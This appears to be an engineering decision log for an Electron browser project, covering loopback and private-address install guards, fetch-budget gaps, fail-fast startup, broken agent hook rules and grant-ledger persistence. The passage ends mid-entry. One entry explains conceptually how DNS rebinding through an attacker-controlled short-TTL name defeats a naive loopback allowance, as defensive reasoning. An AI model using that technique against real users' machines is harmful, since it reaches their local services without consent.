**The "not live today" premise above expired on 2026-09-03.** `loaderSubsystem` was wired to a
real `Loader` and a real Electron `Fetch` (`98c4871`, `stream/loader-05-node-storage`). The gap
is now reachable in the shipped tree, which is what moved this from filed to decided.

**Resolved 2026-09-03, owner decision: loopback stays installable, but only as a user-supplied
literal.** Precisely:

- `127.0.0.1`, `[::1]` and `localhost` are installable **only** when the URL came from a user
  action (typed into the address bar, or an explicit "open as app" on something the user typed),
  and **only** as a literal.
- **Never** from a page-supplied hint (a `<link rel="orivon-manifest">` on somebody else's site).
- **Never** via a hostname that merely *resolved* to a loopback address.
- Every other private, link-local, CGNAT and cloud-metadata range is refused outright,
  regardless of provenance.

**Why this shape and not the two simpler ones.** The owner's first instinct was to allow loopback
unconditionally, on the reasoning that it is the user's own machine. That was withdrawn once the
consequence was traced: a plain "allow loopback" is defeated by DNS rebinding, and not
marginally — an attacker does not need to hand Orivon a `127.0.0.1` URL at all. They supply
`evil.example` with a one-second TTL that answers with a public address when validated and
`127.0.0.1` when fetched. If loopback is permitted at all, there is no check left for that to
fail, so "block private except loopback" collapses into "block nothing" against anyone who
controls a DNS name.

Restricting to a **literal** is what closes it, and it closes it structurally rather than by
vigilance: a literal address never goes through DNS, and `localhost` is special-cased by the
resolver, so there is nothing left to rebind. The provenance condition closes the other half —
a hostile page can no longer make the shell reach into the user's own machine, which matters
because this request is issued by the shell itself, before any manifest exists and with no
capability grant gating it: the most privileged network position in the product.

**What this beat.** A strict block plus a developer flag was the standing AI recommendation and
was rejected as strictly worse for the same security outcome: it needs a flag that must be
verified off at packaging time, and it breaks `http://localhost:3000` for the person building an
Orivon app. The literal-plus-provenance rule gives the same posture with no flag and no broken
development story.

**What is deliberately still permitted, and why it is acceptable.** A user who types
`http://127.0.0.1:9222` themselves will reach it. That is not a hole in the same sense — it is
the user acting on their own machine on purpose, which is the same authority they already have
in any browser's address bar. The threat this closes is a *third party* causing that request.

**Implementation constraint, not a decision:** follow `connect.ts`'s existing T12 discipline —
resolve once, validate every returned address, then fetch the IP literal that was validated.
Re-resolving the name after the check reopens the window the check exists to close.

**Needed by:** now — this is live in the tree as of `98c4871`.

**Implemented 2026-09-04 (`stream/loader-09-install-origin-guard`).** Found still genuinely
unbuilt while scoping the discovery-trigger wiring — the resolution above recorded the owner's
decision but nothing in `fetch-bundle.ts` yet acted on it. `fetchBundle()` now takes a `resolveFn:
Resolver` (the same type `policy/connect.ts` defines) and rejects before its first network request
if the install origin's hostname resolves — or, for a literal, classifies — as anything but
public-unicast (`install-origin.ts`, split out once adding this pushed `fetch-bundle.ts` over the
500-line limit). No loopback carve-out is implemented: the only discovery trigger is the
page-supplied hint, which is exactly the case this entry's own resolution says loopback must never
be reachable from, so the carve-out has no live path to attach to. That leaves a real,
plainly-stated gap — a developer building their own local Orivon app cannot use the discovery
trigger against `localhost` at all — tracked as its own entry, A65, rather than silently worked
around.

**Corrected 2026-09-05.** The sentence above originally claimed `loaderSubsystem` wires "the same
`resolveHost` `createBroker` already uses, not a second resolver" — true of the first commit, made
false by the same lane's own follow-up fix and never updated here. `loaderSubsystem` now wires
`electronResolveHost` (Electron's `net.resolveHost` — the resolver Chromium's own `net.fetch`
actually consults), a deliberate **second, different** `Resolver` implementation from the broker's
node:dns-based one. See **A66** for why: reusing one resolver for both a raw TCP dial and a
Chromium-mediated fetch would answer the wrong question for one of the two callers, and A66 is
also where this guard's real residual limitation — the validated address cannot be pinned for the
actual Electron fetch — is recorded in full.

---

### A52 — two residual gaps a real `Fetch` must close, not `fetch-bundle.ts` **[AI-REC]**

Found 2026-09-03, fixing an adversarial review's findings against `stream/loader-02-fetch-cache`
(build step 4) before merge. Two of the three findings (an uncaught `new URL()` and the
duration-axis T11b gap `BUNDLE_TIMEOUT_MS` now closes) were fully fixable inside this file. Two
narrower gaps were not, and are recorded here rather than silently left as "should be fine":

**1. A signal-ignoring `Fetch` still leaks one abandoned promise per timeout.** `raceAbort`
(this file) races a promise against an `AbortSignal` and moves on the instant the signal fires
— but it never forces the original, abandoned promise to settle or release what it holds. If
the injected `Fetch` (or a body stream's `read()`) does not itself react to the signal it was
given, that promise — and whatever real resource backs it, a socket, a timer, buffered bytes —
keeps existing until it settles on its own, if it ever does. `AbortSignal` is cooperative by
design; nothing on the caller's side can force a non-cooperating callee to cancel. `reader.
cancel()` (already called on every timeout path) is a real, spec-guaranteed mitigation for the
body-read phase specifically, because cancelling a `ReadableStreamDefaultReader` is required to
propagate to the underlying source regardless of `Fetch`'s own behaviour — but nothing
equivalent exists for the initial `fetchFn(url, signal)` call itself.

`BUNDLE_TIMEOUT_MS` (added this pass) is a real, if partial, mitigation: it bounds how many
such abandoned attempts one `fetchBundle()` call can accumulate — roughly 30 in the worst case,
the multiple `BUNDLE_TIMEOUT_MS` is set to (`30 * FETCH_TIMEOUT_MS`) — not the 4095 an
unbounded install could previously reach. It does not make the leak zero.

**2. The incremental byte cap is bounded by "one chunk", not "the cap".** `readBodyWithBudget`
rejects the instant a running total exceeds a cap, but it can only do that after `await reader.
read()` has already handed back a chunk — and that chunk is already fully allocated by then,
sized however the stream's producer decided, not this loop. A producer that returns the whole
body as a single `read()` — a decompressing fetch, a naive shim that buffers then emits once, a
real undici under a gzip bomb — still allocates that one oversized chunk before the rejection
can fire. Proven still-correct (the rejection does fire) by a new test in `fetch-bundle.test.
ts`; the allocation itself is what remains open. A bounded (BYOB) reader would close this, but
requires the stream to declare `type: 'bytes'`, which this file's own minimal structural
`FetchResponse` type (chosen so tests can stub it trivially) does not guarantee, and a stub or a
naive real implementation is unlikely to provide.

**AI recommendation:** the real `Fetch` implementation, when it is built, must (a) itself
observe the `AbortSignal` it is given and promptly abort/release the underlying request on it —
not merely tolerate the caller giving up on waiting — and (b) either use a BYOB reader with a
bounded view size, or otherwise avoid handing back single chunks larger than a few times
`MAX_ASSET_BYTES`'s neighbourhood. Neither is enforceable from `fetch-bundle.ts` as written.

**Needed by:** whoever builds the real `Fetch` (wiring this loader to actual Node/Electron I/O
is itself still open — see this file's own header and `CLAUDE.md`'s "Still open" note). Not
blocking this PR: both gaps are already strictly better than main, and neither is reachable
with the stubbed `Fetch` every current caller uses.

### A49 — `node-gyp` is now a permanent, always-installed member of the dev tree, dormant behind one unenforced line **[STILL OPEN]**

Found 2026-09-03, reviewing `packaging-01-build-verify` (PR #47), after the owner had already
approved the `electron-builder` devDependency itself. **This entry is about the durable policy
question that approval leaves open, not about reversing it** — the dependency stays either way.

Verified directly against the installed tree, not assumed: `app-builder-lib` (electron-builder's
implementation package) depends on `@electron/rebuild@4.2.0`, which depends on
`node-gyp@12.4.0`. Both are listed as ordinary dependencies of `app-builder-lib` — not
`optionalDependencies` — so both install unconditionally on every platform, every time
`electron-builder` is a devDependency of this repo, which it now is
(`node_modules/@electron/rebuild`, `node_modules/node-gyp` both present). `electron-builder.yml`'s
`npmRebuild: false` is the only thing standing between that installed `node-gyp` and it actually
running: `node_modules/app-builder-lib/out/packager.js:454-455` checks exactly this flag before
deciding whether to call into a real rebuild.

**`npm run check:natives` structurally cannot see this.** Its scope, by Rule 8's own literal
wording, is install-time scripts — whether anything runs a compiler when `npm install` runs. It
says nothing about, and cannot say anything about, what a later `electron-builder` invocation
does. The gate that currently passes and the gap that currently exists are simply about two
different moments; the automated check was never going to catch this one.

**The open question for the owner:** does Rule 8 ("pure-JS dependencies only... native modules
break run-from-source on Windows and macOS") mean *nothing compiles at `npm install`* — true
today, and all `check:natives` verifies — or the stronger *no native build tooling exists
anywhere in the tree*, which is now false? Both readings were indistinguishable before this PR,
because nothing in the tree depended on `node-gyp` at all. They diverge starting now.

**AI leaning, not a decision:** if the owner wants the stronger property enforced, a guard would
need to check something `check:natives` does not today — e.g. that no installed package's own
`package.json` lists `node-gyp` (or another native-build tool) as a non-optional dependency
anywhere in the resolved tree, run at `postinstall` alongside `check:natives` rather than folded
into it (a different question: install-time toolchain presence, not packaging-time
configuration). This is a leaning sketched for whoever the owner assigns it to, not a design
committed to — building it now would be scope creep into a PR already carrying two unrelated
fixes (docs/development/pr-blueprint.md's anti-pattern list).

**Needed by:** before Windows/macOS packaging is scoped as a real build step — this PR's own
`electron-builder.yml` is explicitly Linux-only. Not blocking `packaging-01-build-verify`.

### A51 — a critical subsystem now fails startup loudly; is fail-fast the right shape long-term **[AI-REC]**

Found 2026-09-03, in a three-persona adversarial review of `stream/broker-15-reachable`
(A47's own branch). `publishBroker`'s throw was caught by `runAfterReady`'s failure collection
and demoted to one `console.error` line (`main/index.ts`'s `report()`); the app then booted a
completely normal-looking shell window with the control channel never registered, so every
`orivon.*` call from every app was silently unroutable. The change had turned a silent *data*
bug (two disagreeing grant ledgers) into a silent *availability* bug (the capability layer going
dark) — an improvement, but still invisible exactly where `runBeforeReady`'s own "must never be
quiet" philosophy says it must not be.

**Fixed on `stream/broker-17-ctx-broker`:** `Subsystem` gained an optional `critical` flag
(`registry.ts`), copied onto each `SubsystemFailure`; `brokerIpcSubsystem` (`src/broker/transport/ipc.ts`)
is the first subsystem marked `critical: true`. `main/index.ts` now calls the new
`criticalFailureMessage(failures)` after each phase and, if it returns non-null, calls
`dialog.showErrorBox` and `app.exit(1)` instead of calling `createShellWindow()` — a browser
whose capability layer is dead does not open at all, rather than opening one that only looks
like it works.

**What is decided vs. still open.** That a critical subsystem's failure must be impossible to
miss is not in question. What is an AI recommendation, not an owner decision:

1. **Fail-fast + native dialog, not a degraded mode.** An alternative considered and rejected:
   open the shell window anyway with an in-page banner (e.g. a chrome-view indicator saying
   capabilities are unavailable), which would at least let a user retry a normal tab. Rejected
   here because the shell chrome itself is rendered by ordinary web content with no special
   authority to assert "the broker is down" trustworthily, and because a half-working browser
   that silently denies every `orivon.*` call is arguably a worse experience than one that
   visibly refuses to start. Not tested against real users either way.
2. **`dialog.showErrorBox` + `app.exit(1)`, not a friendlier recovery flow** (retry, a link to
   diagnostics, an automatic restart). Chosen as the smallest change that makes the failure
   impossible to miss, per this task's own brief — not because a better UX doesn't exist.
3. **Only `brokerIpcSubsystem` is marked `critical` today.** Whether a future `src/shim/` or
   `src/trust/` subsystem should also be critical is for whoever builds it to decide, following
   this pattern (`Subsystem.critical`'s own doc in `registry.ts`) rather than reinventing one.

**Related to A47, not a duplicate:** A47 asks who may edit `registry.ts` at all; this asks
whether the failure-handling shape chosen inside it, once editable, is the right one long-term.

**Needed by:** before packaging (build step 10), when a real user first sees this dialog instead
of a console line. Not blocking — the behaviour is strictly louder than what it replaces either
way.

---

## B. Contradictions still to fix

### B2. What does DDOC stand for?
Three expansions across three documents, one of them public: *Domain Data Ownership
**Confirmation*** (`orivon.mdx`), *Domain Data Ownership **Certification***
(`Posts/Technical Specifications`), ***Data Domain** Ownership Certification* (`Glossario`).
Trivial to fix; needs one canonical form in `glossary.md`.

### B3. Two different trustlessity ladders — RESOLVED, public docs need updating
Public `web3-score.md` gives websites **4** levels; private `Web3 Verification levels` gives
**5**, including *"full-stack runs entirely locally"* as L3 — a level that vanished publicly
even though local-executability is central to the "installable Web3sites" argument.

→ `ADR-0006` resolves this **in favour of the private version**: "runs entirely locally" is
reinstated, and it is automatically decidable. **Action outstanding: correct the public docs**
to reinstate that level and to mark which levels are automatic versus judged. The `+Privacy`
placement (L4 publicly, L5 privately) still needs one canonical answer.

### B4. Zero-setup auto-connecting accounts — resolved, with a validation correction
`La Piramide dei Pilastri` and `OrivonBook` both state that accounts are pre-installed with
no setup and auto-connect to sites.

**Correction found in the validation pass:** the first resolution ("per-origin keys only, no
cross-origin linkage, NIP-07 as first consumer") was **internally contradictory** — a Nostr
identity must be the *same* across every client site, or follows and posts fragment per
client. Nobody caught this until the validation read.

**Corrected model** (`capability-api.md`): silent **per-origin app keys** for apps, plus
**named identities** that are cross-origin *by explicit consent* — a per-site connect prompt,
revocable. NIP-07 rides the named-identity path, not the per-origin path. A funds-bearing
wallet remains a separate, setup-requiring thing named differently in the UI.
**Still open:** the exact UI language distinguishing throwaway keys / named identities /
wallets.

---

## C. Technical unknowns

### C1. DDOC's trust root is DNS — worth anything on ICANN domains? **[RESEARCH]**
Deferred with A4b. Also unexamined: `Glossario`'s claim that DDOC justifies **self-signed
HTTPS** on compliant sites. That needs hard scrutiny before it is repeated publicly.

### C2. DDOC's unlisted-file rule looks unsound **[RESEARCH]**
`Archivio/Struttura Stack` argues a file absent from the hash-tree is nevertheless valid
because the load chain started from an owned root. Implemented literally, any page induced to
fetch an unlisted resource escapes DDOC entirely — defeating the stated goal of detecting
server compromise. Needs a strict-mode rule.

### C3. Capability API open items **[AI-REC]**
Listed at the end of `architecture/capability-api.md`: whether `net.listen` is grantable to
unsigned apps; whether grants are keyed per origin or per origin + manifest version; whether
`fs.quotaBytes` is enforced or advisory.

### C4. NIP-07 injection conformance **[RESEARCH — cheap]**
The ~1 day Nostr estimate assumes existing clients accept an injected `window.nostr` cleanly.
Verify against two or three real clients before treating the estimate as settled. Licences
also need checking per client — several are AGPL.

### C5. Reuse-vs-build not yet analysed **[RESEARCH]**
Outstanding for: ENS resolution, IPFS (embedded vs. Kubo subprocess vs. gateway), the DDOC
generator. Settled for: WASM host (deferred), Electron shell (build, do not fork), torrent
engine (`webtorrent` library), Nostr (inject NIP-07, reuse third-party clients).

### C6. Playwright `_electron` fails to attach to one window — cause unknown **[RESEARCH]**
Found during the week-0 spike (gate 3, video playback). A direct, non-Playwright launch of the
app loads and plays normally — confirmed via `dom-ready`/`did-finish-load` firing and matching
renderer console output to every other gate. Launched through Playwright's `_electron.launch()`
then `app.firstWindow()`, the call times out after 30s. Playwright's own CDP session to the
main process is healthy (`DEBUG=pw:electron,pw:browser` shows the browser-level DevTools
connection succeeding), but no target-created event for the window is ever logged — so this
looks like an Electron/Chromium CDP auto-attach issue, not a Playwright installation problem.
Six causes ruled out (full trail: `planning/spike-results/gate-3.json`); the `<video>` element
and a raw-CDP-client test remain untried. **Matters because `build-plan.md`'s single
highest-value automated test (the capability-rejection e2e) uses the identical `_electron`
driver** — not confirmed affected (gates 0/1a/1b/4 all attach fine on the same driver), but
worth a five-minute check the first time that test is written, before build step 2 is called
done on the strength of it.

**Narrowed 2026-08-26, build step 1.** A minimal `BaseWindow` with two `WebContentsView`s
(one chrome-style view, one content view — the exact composition the shell now uses)
attaches cleanly under `_electron`: `app.windows()` reports both with correct URLs, and
`app.firstWindow()` resolves immediately with no timeout, in view-add order. **So the failure
is not `BaseWindow`/multiple-`WebContentsView`s in general** — it is specific to something in
gate 3's actual composition (video element, service worker, or the
`protocol.registerSchemesAsPrivileged()` call, none of which this probe exercised). Practical
consequence for the shell: `app.firstWindow()` is not reliable long-term (it depends on
view-add order, which is an implementation detail, not a contract) — the shell's own smoke
test matches windows by URL/title via `app.windows()` instead of relying on first-added
ordering.

**A related but distinct flake, hit twice in the 2026-09-05 review/merge run (PRs #72 and #73):**
`test/e2e-capability-boundary.test.ts`'s Phase 1 (the same `_electron` driver this entry is
about) intermittently timed out on `chrome.click('#address')` in CI, despite
`waitForAddressBarStable` already reporting the element's bounding box had stopped moving —
proven a genuine flake, not a regression, by two CI runs against the *identical* commit, one
red and one green. Bounding-box stability proves position stopped changing; it does not prove
Chromium's compositor caught up to it, which is a plausible cause distinct from this entry's own
"no target-created event" mystery. **Mitigated, not resolved:** the click/fill/press sequence
now retries once, re-running `waitForAddressBarStable` first, if the first attempt hits exactly
this timeout signature (`clickAddressBarRetrying`, same file). A second consecutive failure on
the same element still fails the test for real — this is a bounded, explicit retry against a
named environmental race, not a general-purpose retry-until-green. This entry's own root cause
(the CDP auto-attach question) remains exactly as unknown as before; only the address-bar
symptom has a mitigation.

---

## BB. Public-docs corrections — and what is *not* one

**The MVP being narrower than the vision is not a contradiction.** It is expected, and nothing
in `mvp-scope.md`'s non-goals implies the final product is limited the same way. Those
non-goals are MVP-scoped only.

Only genuine errors belong here — statements wrong **independently of the MVP**:

| # | Correction | MVP-only? |
|---|---|---|
| 1 | `orivon.mdx`: *"bitcoind … would be **already** runnable as a site on Orivon"* states a future goal in the present tense. **Fix the tense, keep the ambition.** | **Yes, scoping** — but the tense makes it read as a current property, and it is the first claim a technical evaluator will test |
| 2 | `web3-score.md` is missing the site level *"full stack runs entirely locally"*, which is real and automatically detectable (`ADR-0006`) | **No** — it would be missing from the final product too |
| 3 | `roadmap.mdx` does not reflect that trustless resolution is a **prerequisite** for DDOC and site-level scores. DDOC anchors in a DNS record, forgeable on ICANN domains without DNSSEC | **No** — a permanent dependency in the final architecture |
| 4 | DDOC expansion differs across three documents (`glossary.md`, B2) | **No** |

Owner-side work. Not blocking the MVP, but worth doing before it draws attention.

---

## CC. Accepted tradeoffs

Decided, not open. Recorded so the reasoning is visible later rather than rediscovered.

### Advertising priced by trustlessity level
**Owner's decision.** Ad priority and price key to trustlessity level (`economical-strategy.md`):
lower level ⇒ higher price and lower priority. A deliberate penalty on centralised entrants and
a subsidy to decentralised ones — a tax on centralisation, not a sale of trust.

**Owner's reasoning, in full:**
1. Orivon is ultimately a for-profit company. It is incentivised to grow the ecosystem toward
   trustless solutions through sponsorship, but also to accept non-trustless sponsors when the
   money is materially better — because that money funds further innovation for Web3. A
   rational trade for the ecosystem's benefit, even if it sounds bad.
2. A score provider is incentivised to score accurately, because being trusted is the entire
   point of it. Trustlessness and security are what give the provider its value.

**AI counter-position, recorded once and then dropped.** Point 2 is correct in isolation, but
it does not address point 1 — the two are separate claims, and the difficulty is their
intersection: Orivon scoring the entities that pay Orivon.

The empirical record on reputation as discipline is specific: it holds when the scorer is *not*
paid by the scored, and fails when it is, independent of intent.
- Moody's and S&P rated CDOs AAA while paid by issuers; the "our reputation protects you"
  argument was made explicitly and publicly, and failed. Both remain profitable.
- Arthur Andersen and Enron: same structure, same outcome.
- EasyList, not paid by advertisers, has held its reputation for two decades. Eyeo's
  Acceptable Ads, which took payment for whitelisting, is distrusted in exactly the community
  Orivon targets.

The mechanism is not bad actors: reputation damage is slow and diffuse, revenue is immediate
and concentrated, and that asymmetry compounds.

On point 1 specifically, the objection is **timing, not principle**. Brave is the direct
precedent — ads, BAT, profitable — and was badly damaged by the 2020 affiliate-link injection
over small money, with precisely this audience. It survived because it already had millions of
users. At 100 users reputation *is* the whole asset, with no product moat to absorb a hit. The
strategy becomes survivable once there is something to lose that is not reputation.

**Mitigation available at zero revenue cost** (recorded, not a condition): price ads from a
*third-party* provider's attestations rather than Orivon's own. This removes the self-dealing
while keeping the pricing model exactly as intended. `ADR-0006` makes it nearly free, since
attestations are portable signed statements over bundle hashes.

**Unaffected and independently sound:** charging for *faster evaluation*. `ADR-0006` shows
attestation lag is real friction, so reducing it is a legitimate paid service.

**Status: owner-decided, post-MVP, reversible. Not to be re-raised.**

---

## D. Parked (post-MVP)
Dashboard widget grid · App store · Web3 search · Wallet Crypto/Address-book layers and
`CapabilityDescriptor` · Mobile · DAO / tokenomics · Proxy chains and VPN mode · Client
Profile separation · DDOC · Trustless resolution · `subprocess` and `hid` capabilities ·
Identity export/backup · Cross-device sync.

### A25 -- the documented example of an unparseable version is parseable **[AI-REC]**

Found while implementing `loader/manifest.ts` (2026-08-27) and verified directly against the
real `compareVersions`/`parseVersion`.

`architecture/capability-api.md` and `src/broker/policy/update.ts`'s own comment both offer
`"2026-08-26"` as the example of a version string that cannot be ordered, and therefore fails
closed at update time. **It parses.** Hyphens are legal in a semver prerelease identifier, so
`2026-08-26` reads as major `2026` with prerelease `08-26` and orders against other versions
without complaint.

The *rule* is unaffected -- unorderable versions should still be rejected at first install, and
`loader/manifest.ts` does that. Only the example is wrong.

**AI recommendation:** replace the example in both places with something genuinely unorderable
(`"v1.0"`, `"latest"`, `"1.0.0.0"`). A wrong example in a specification is worse than none: the
next person writes a test asserting `2026-08-26` is rejected, watches it fail, and concludes the
implementation is broken.

**Needed by:** whoever next touches version handling. Not blocking.

### A26 -- three port-range parsers **[AI-REC]**

`connect-patterns.ts` exports one, `update.ts` keeps a private one, and `loader/manifest.ts`
added a third (2026-08-27). Each was written because neither of the others was legally reusable
from where it stood -- `policy/` may not import from `loader/`, and `update.ts`'s is private to
a decision function that must not grow a dependency on pattern matching.

This is the shape `CLAUDE.md` Rule 3 exists to catch, and the codebase has already done one
dedupe pass for exactly this. The reasons are individually sound, which is how three of
something appears without anyone deciding to have three.

**AI recommendation:** move the port-range grammar into `src/shared/`, which exists precisely
for a helper needed on both sides of a boundary, is change-controlled like contracts, imports
nothing, and is currently empty. The audit that created it concluded nothing crossed that
boundary yet. Something does now.

**Needed by:** before a fourth appears. Not blocking.

### A53 — every `BookmarkStore` ever constructed is retained for the lifetime of the process **[AI-REC]**

Found 2026-09-03, reviewing the fix that added `BookmarkStore.flushAll()` for the quit-time
bookmark flush.

`BookmarkStore` self-registers into a private static `Set` in its constructor, because
`src/main/index.ts`'s quit path has to flush every window's store and holds a reference to none of
them — each is a local inside `src/main/window.ts`'s `createShellWindow()`. Nothing ever removes an
entry, so closing a window does not release its store: the instance, its bookmark list, and its
subscriber callbacks stay reachable until the process exits.

The in-place comment calls this "a permanent no-op flush (nothing left to write), which costs
nothing to keep". That is true of the *flush*, and understates the *retention* — a long session
that opens and closes many windows accumulates stores without bound. The amount is small per store
and this is not a leak a user would notice soon, which is why it is filed rather than treated as a
defect in that change.

**Why it was not fixed there.** The clean fix is a `dispose()` (or a `WeakRef`-based registry)
called when a window closes, and the call site is `src/main/window.ts` — the shell stream's file,
outside that lane's owned paths. Registering a store is also not obviously the right shape long
term: threading one reference from `createShellWindow()` to `index.ts` would remove the need for a
registry at all.

**AI recommendation, not a decision:** prefer removing the registry over adding a `dispose()` — a
store that the quit path can reach directly needs no global list, and the current design exists
only because the reference was not available. Either way this is a shell-stream call.

**Needed by:** before a second static registry of the same shape appears, or before anything else
is added to `BookmarkStore` that holds meaningfully more memory than a bookmark list. Not blocking.

---

---

### A54 — the comment-budget baseline holds 16 files, and `check-size.mjs` duplicates `isTestFile` **[PARTIALLY RESOLVED]**

Filed 2026-09-03, on `stream/backlog-08-comment-budget`, which added Rule 1's comment budget
(`scripts/check-comments.mjs`, `code-guidelines.md` §The budget).

Two loose ends, both deliberate, both cheap to close once the branches in flight have merged.

**1. RESOLVED on `stream/backlog-15-comment-sweep` (2026-09-07).** The 15 files actually in
`scripts/comment-budget-baseline.txt` (not 16 — that count was already stale when this entry
was filed) are all within budget now; the file was deleted rather than left empty, since
`check-comments.mjs`'s own `readBaseline` already treats a missing file as an empty one
(verified directly before relying on it). The header essays moved to each directory's
`README.md` under `## Design notes`, per the pattern below.

**2. STILL OPEN. `isTestFile` now exists twice.** `scripts/check-comments.mjs` and
`scripts/check-size.mjs` — the latter on `main` since `stream/packaging-01-build-verify` merged,
still not wired into CI or `postinstall` (`code-guidelines.md` §Status) — each define the same
predicate over `code-guidelines.md`'s own "test file" definition. A textbook Rule 3 duplicate,
still unconsolidated: this entry was written before `packaging-01` merged, and the move itself —
`isTestFile` into `scripts/cli.mjs`, which already gained a home for shared guard helpers via
`trackedFiles` on this branch — is separate work from resolving this merge, not done here.

---

### A55 — two hookify rules had never fired, and nothing would have reported it **[STILL OPEN]**

Found 2026-09-03, while adding a hookify rule for the comment budget.

`hookify.comment-narration.local.md` (added 2026-09-02, for Rule 1) and
`hookify.scope-creep.local.md` (added 2026-08-26, for Rule 4) both matched `file_path` against
`^(src|apps|...)/`. **`Write` and `Edit` always pass an absolute path**, so neither pattern
could ever match. Both rules loaded cleanly, reported no error, and did nothing. Verified by
driving the plugin's own `posttooluse.py` with a synthetic payload — absolute path, no output;
relative path, the warning appears. Both are fixed on this branch and re-verified the same way.

The narration rule was the owner's response to an audit that found eight bad comments across
three streams. **It has never run.** That is the second time in two days that a correction to
Rule 1 did not take, and it is a meaningful part of the answer to "why do agents keep doing
this" — for one of those days, the enforcement was silently absent.

Two properties of hookify make this failure mode quiet, and both are now in `CLAUDE.md`:

- A rule whose conditions never match is indistinguishable from a rule that is working. There
  is no "this rule has never fired" report, and `/hookify list` shows it as enabled.
- **There is no `not_regex_match` operator.** An unknown operator returns false, which kills the
  entire rule rather than just that condition — so a plausible-looking typo disables the rule
  silently too. This branch nearly shipped one.

**Still open:** whether the other five rules are actually firing. Three (`electron-webprefs`,
`no-native-languages`, `package-json-natives`) use unanchored suffix patterns and are fine by
inspection; `hardcoded-paths` and `native-modules` were not tested. **AI recommendation:** a
tiny fixture that drives each rule through `posttooluse.py` and asserts it fires, run the way
`scripts/check-*.mjs` are. A guard nobody can tell is broken is worse than no guard, and this
repository now has seven of them.

---

### A56 — the "Awaiting owner decision" index table has at least one stale row **[STILL OPEN]**

Found 2026-09-03, resolving PR #55's merge against `main` — checking that this branch's
renumbered `A48`→`A54`/`A49`→`A55` (see `A54`) did not collide with anything in the `## A.
Awaiting owner decision` summary table near the top of this file.

The table's `A48` row reads "Two residual gaps in `fetch-bundle.ts`'s byte/time budget cannot
be closed from this file alone..." — but the entry actually titled `### A48` further down is
"the credit-window backpressure design is half-built", a different topic entirely. The
byte/time-budget text the table describes now matches `### A52` ("two residual gaps a real
`Fetch` must close, not `fetch-bundle.ts`"). At some point `A48` was renumbered to `A52` and the
summary row was not updated to match — predates this branch and predates `A52`/`A53`'s own
recent additions; not caused by, or a consequence of, this merge.

**Not fixed here.** This branch's merge resolution touched the tail of this file, not this
table, and confirming this is the table's *only* stale row (rather than a symptom of the table
having drifted more broadly since it was last verified against the entries below it) needs a
full table-against-entries pass this resolution did not do. Filed rather than spot-fixed, so a
partial fix does not read as "checked and clean."

**AI recommendation:** a full pass comparing every table row's summary against its linked
entry's current title, next time this document is opened for an unrelated reason — the check is
mechanical (row text vs. entry title) and cheap once someone is already in the file.

**Needed by:** before the table is trusted as a reliable index rather than a historical
snapshot. Not blocking.

---

### A57 — `GrantLedger` has no persistence: everything resets on process restart, not just app uninstall **[RESOLVED 2026-09-04]**

Found 2026-09-03, as the required follow-up from PR #61's review (T19's version floor,
`GrantLedger.versionFloor`).

`GrantLedger` is constructed fresh, in-memory, exactly once per process launch —
`src/broker/index.ts:259` is the only call site (`grep -rn "GrantLedger(" src/` finds no other
construction and no persistence layer anywhere in `src/`). Every field on `OriginRecord`
(`manifest`, `grants`, `fsBytesWritten`, and now `versionFloor`) resets to nothing the moment the
process restarts, regardless of whether the app itself was ever uninstalled.

**Distinct from A29.** A29 is about `fsBytesWritten` specifically: a resource-limit gap where a
careless app can outwrite its declared disk quota simply by restarting the browser. This entry is
about `versionFloor` specifically, and the shape of the failure is different. `ADR-0009` states
explicitly that the version floor "must survive an uninstalled/reinstalled app" and that a floor
that dies with the pin record is "a rollback oracle" — surviving past uninstall is the entire
reason the floor was placed in the grant ledger rather than the pin record. A floor that dies with
the whole process, not just with the pin, fails that same requirement in a strictly bigger way: an
adversarial host does not even need the user to uninstall and reinstall the app to roll it back to
an older, vulnerable version — restarting the browser is enough. That makes this a T19
replay-guard bypass against an adversarial host, not a resource-accounting gap against a careless
one.

**Not yet a live risk.** `versionFloorFor` is defined and exposed on the `Broker` interface as
"the app loader's seam" (its doc comment in `src/broker/index.ts`), but nothing outside
`src/broker/` calls it yet — `grep -rn "versionFloorFor" src/loader/ src/main/ src/shim/` returns
nothing. This entry is filed now, before that wiring exists, so the persistence gap is visible
going in rather than discovered after an adversarial host is already able to exploit it.

**AI recommendation:** none — persistence design (where the floor lives, what survives an
uninstall versus a full app removal, how it interacts with `fsBytesWritten`'s own unresolved A29)
is one decision, not two, and deserves its own pass rather than a fix folded into this PR.

**Needed by:** before `versionFloorFor` is wired into the app loader's update path. Not blocking
for this PR, which only adds the floor — it does not yet enforce it anywhere.

**Resolved 2026-09-04 (PR #68, `stream/broker-21-version-floor-persistence`).** `GrantLedger`
now takes an optional `LedgerStorage`; the version floor is persisted to
`<userData>/grants/<sha256(origin)>/version-floor.json` via a temp-file-then-rename atomic write,
and hydrated on an origin's first touch each session. A first-round fix shipped a real regression
(delaying the in-memory raise until after a successful disk write, so a single failed write left
the in-memory floor at the *old* version for the rest of that session — worse than no persistence
at all, since a same-session replay of the superseded version would then pass). Fixed in a second
round: the in-memory floor now raises unconditionally and first, exactly matching what a
no-persistence ledger already guaranteed; the disk write is attempted after, and a failure is
reported (the promise rejects) rather than silently swallowed. The residual risk — if writes keep
failing until an actual restart, that restart hydrates the stale on-disk value — is this entry's
original, now-understood risk, not a new one, and it is at least observable via the rejection.
Loopback, `file:` and plain-`http` origins never persist a floor at all (`isPersistableOrigin`,
closing A23 below). A60's escape hatch (`GrantLedger.forgetOrigin`) exists for the case this entry
itself did not anticipate — a floor poisoned by a hostile version number, now that a restart can
no longer clear it by accident.

**Correction, 2026-09-04, owner decision.** This entry's own §"Distinct from A29" paragraph
quotes `ADR-0009` stating the floor "must survive an uninstalled/reinstalled app." Asked directly
while scoping the discovery-trigger work that depends on this entry: the owner wants the opposite
— a full "remove this app" action should forget the origin completely, including its floor, with
no permanent tombstone. What was actually built matches the NEW decision, not the quoted old one:
the floor survives a restart only. `ADR-0009` itself is amended (2026-09-04) to record the
reversal, since it was the document making the now-superseded claim.

---

### A58 — nothing bounds total disk usage across origins, or across successive updates to one origin **[RESOLVED 2026-09-04]**

Filed 2026-09-03, `fix-62` (`stream/loader-05-node-storage`), while fixing `readPin`'s
corrupt-pin handling and `electron-fetch.ts`'s redirect trust. (A57 taken by a parallel fix
lane for a different gap, filed the same day — see that lane's own record.)

`fetch-bundle.ts` already bounds ONE bundle install: `MAX_BUNDLE_BYTES` (64 MiB) and
`MAX_ASSET_BYTES` (16 MiB) cap a single `fetchBundle()` call. Nothing bounds total disk usage
beyond that single call's own budget. Two distinct gaps, both real:

1. **Across DIFFERENT origins.** Every distinct origin that gets pinned gets its own `code/`
